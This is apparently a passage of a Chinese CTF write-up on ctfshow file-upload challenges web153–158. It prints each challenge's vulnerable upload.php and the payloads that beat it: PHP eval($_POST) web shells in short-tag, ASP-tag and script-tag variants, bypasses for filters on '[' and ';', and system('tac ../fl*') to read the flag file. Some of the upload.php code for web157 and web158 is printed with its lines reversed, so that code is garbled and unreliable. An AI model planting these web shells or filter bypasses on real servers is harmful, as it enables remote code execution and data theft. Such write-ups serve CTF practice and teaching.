class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$arr</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="variable">$ext_suffix</span> = <span class="variable">$arr</span>[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$ext_suffix</span>!=<span class="string">&#x27;php&#x27;</span>)&#123;</span><br><span class="line">                <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">                <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件类型不合规&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件类型不合规&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br></pre></td></tr></table></figure><h1 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h1><h2 id="短标签绕过"><a href="#短标签绕过" class="headerlink" title="短标签绕过"></a>短标签绕过</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?@eval($_POST[&#x27;zf&#x27;]);?&gt;开启配置参数short_open_tags=on</span><br><span class="line"></span><br><span class="line">&lt;?=@eval($_POST[&#x27;zf&#x27;]);?&gt;等价于&lt;?php echo (表达式)?&gt;不需要开启参数设置</span><br><span class="line"></span><br><span class="line">&lt;%@eval($_POST[&#x27;zf&#x27;]);%&gt;开启配置参数asp_tags=on,7.0以下可以使用</span><br><span class="line"></span><br><span class="line">&lt;script language=&quot;php&quot;&gt;@eval($_POST[&#x27;zf&#x27;]);&lt;/script&gt;不需要修改参数开关，但是只能在7.0以下可</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409160142938.png" alt="image-20220409160142938"></p><p>只有这个可行</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409160318682.png" alt="image-20220409160318682"></p><p>upload.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-10-24 19:34:52</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-10-26 15:30:10</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="variable">$filesize</span> = (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$filesize</span>&gt;<span class="number">1024</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">1</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件超过1024KB&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$arr</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="variable">$ext_suffix</span> = <span class="variable">$arr</span>[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$ext_suffix</span>!=<span class="string">&#x27;php&#x27;</span>)&#123;</span><br><span class="line">                <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">strrpos</span>(<span class="variable">$content</span>, <span class="string">&quot;php&quot;</span>)==<span class="literal">FALSE</span>)&#123;</span><br><span class="line">                    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">                    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">3</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件内容不合规&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件类型不合规&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件类型不合规&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409160958426.png" alt="image-20220409160958426"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?@eval($_POST[&#x27;zf&#x27;]);?&gt;开启配置参数short_open_tags=on</span><br><span class="line"></span><br><span class="line">&lt;?=@eval($_POST[&#x27;zf&#x27;]);?&gt;等价于&lt;?php echo (表达式)?&gt;不需要开启参数设置</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409162026191.png" alt="image-20220409162026191"></p><p>upload.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-10-24 19:34:52</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-10-26 15:49:51</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="variable">$filesize</span> = (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$filesize</span>&gt;<span class="number">1024</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">1</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件超过1024KB&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$arr</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="variable">$ext_suffix</span> = <span class="variable">$arr</span>[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$ext_suffix</span>!=<span class="string">&#x27;php&#x27;</span>)&#123;</span><br><span class="line">                <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$content</span>, <span class="string">&quot;php&quot;</span>)===<span class="literal">FALSE</span>)&#123;</span><br><span class="line">                    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">                    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件类型不合规&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件类型不合规&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件类型不合规&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br></pre></td></tr></table></figure><h1 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h1><h2 id="过滤"><a href="#过滤" class="headerlink" title="过滤[]"></a>过滤[]</h2><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409162822037.png" alt="image-20220409162822037"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?@eval($_POST&#123;&#x27;zf&#x27;&#125;);?&gt;开启配置参数short_open_tags=on</span><br><span class="line"></span><br><span class="line">&lt;?=@eval($_POST&#123;&#x27;zf&#x27;&#125;);?&gt;等价于&lt;?php echo (表达式)?&gt;不需要开启参数设置</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409162937037.png" alt="image-20220409162937037"></p><p>upload.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2020-10-24 19:34:52</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2020-10-26 15:49:51</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">    <span class="variable">$filesize</span> = (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$filesize</span>&gt;<span class="number">1024</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">1</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件超过1024KB&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$arr</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="variable">$ext_suffix</span> = <span class="variable">$arr</span>[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$ext_suffix</span>!=<span class="string">&#x27;php&#x27;</span>)&#123;</span><br><span class="line">                <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$content</span>, <span class="string">&quot;php&quot;</span>)===<span class="literal">FALSE</span> &amp;&amp; <span class="title function_ invoke__">stripos</span>(<span class="variable">$content</span>,<span class="string">&quot;[&quot;</span>)===<span class="literal">FALSE</span>)&#123;</span><br><span class="line">                    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">                    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件类型不合规&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件类型不合规&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件类型不合规&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h1><h2 id="过滤-1"><a href="#过滤-1" class="headerlink" title="过滤;"></a>过滤;</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?(system(&quot;tac ../fl*&quot;))?&gt;</span><br><span class="line">&lt;?=system(&#x27;tac ../f*&#x27;)?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409163553366.png" alt="image-20220409163553366"><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409164110708.png" alt="image-20220409164110708"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409164115998.png" alt="image-20220409164115998"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">return</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|\&#123;|\[|\;/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件类型不合规&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">            &#125;</span><br><span class="line">                <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件类型不合规&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                </span><br><span class="line">                &#125;</span><br><span class="line">                    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件类型不合规&quot;</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">                    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$content</span>, <span class="string">&quot;php&quot;</span>)===<span class="literal">FALSE</span> &amp;&amp; <span class="title function_ invoke__">check</span>(<span class="variable">$content</span>))&#123;</span><br><span class="line">                <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$ext_suffix</span>!=<span class="string">&#x27;php&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$ext_suffix</span> = <span class="variable">$arr</span>[<span class="string">&#x27;extension&#x27;</span>];</span><br><span class="line">            <span class="variable">$arr</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;type&#x27;</span>] == <span class="string">&#x27;image/png&#x27;</span>)&#123;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">1</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件超过1024KB&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$filesize</span>&gt;<span class="number">1024</span>)&#123;</span><br><span class="line">    <span class="variable">$filesize</span> = (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>);</span><br><span class="line">    <span class="variable">$filename</span> = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>]);</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)</span><br></pre></td></tr></table></figure><h1 id="web158"><a href="#web158" class="headerlink" title="web158"></a>web158</h1><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409164314070.png" alt="image-20220409164314070"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?(system(&quot;tac ../fl*&quot;))?&gt;</span><br><span class="line">&lt;?=system(&#x27;tac ../f*&#x27;)?&gt;</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409164404138.png" alt="image-20220409164404138"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/image-20220409164408362.png" alt="image-20220409164408362"></p><p>upload.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">return</span> !<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/php|\&#123;|\[|\;|log/i&#x27;</span>, <span class="variable">$str</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件类型不合规&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">            &#125;</span><br><span class="line">                <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件类型不合规&quot;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                </span><br><span class="line">                &#125;</span><br><span class="line">                    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">2</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;文件类型不合规&quot;</span>);</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="string">&quot;code&quot;</span>=&gt;<span class="number">0</span>,<span class="string">&quot;msg&quot;</span>=&gt;<span class="string">&quot;upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">                    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]);</span><br><span class="line">                <span class="keyword">if</span>(<span class="title function_ invoke__">stripos</span>(<span class="variable">$content</span>, <span class="string">&quot;php&quot;</span>)===<span class="literal">FALSE</span> &amp;&amp; <span class="title function_ invoke__">check</span>(<span class="variable">$content</span>))&#123;</span><br><span class="line">                <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>]);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$ext_suffix</span>!=<span 